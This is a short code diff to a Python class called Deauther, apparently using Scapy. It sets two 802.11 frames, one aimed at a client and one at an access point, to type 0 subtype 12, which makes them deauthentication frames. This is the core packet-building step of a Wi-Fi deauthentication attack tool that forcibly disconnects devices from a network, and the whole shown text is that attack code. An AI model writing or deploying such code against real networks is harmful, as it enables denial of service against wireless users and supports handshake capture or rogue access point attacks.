@@ -35,6 +35,8 @@ class Deauther:
         pkt_to_client = (
             RadioTap() /
             Dot11(
+                type=0,
+                subtype=12,
                 addr1=client_mac,
                 addr2=ap_bssid,
                 addr3=ap_bssid
@@ -45,6 +47,8 @@ class Deauther:
         pkt_to_ap = (
             RadioTap() /
             Dot11(
+                type=0,
+                subtype=12,
                 addr1=ap_bssid,
                 addr2=client_mac,
                 addr3=ap_bssid
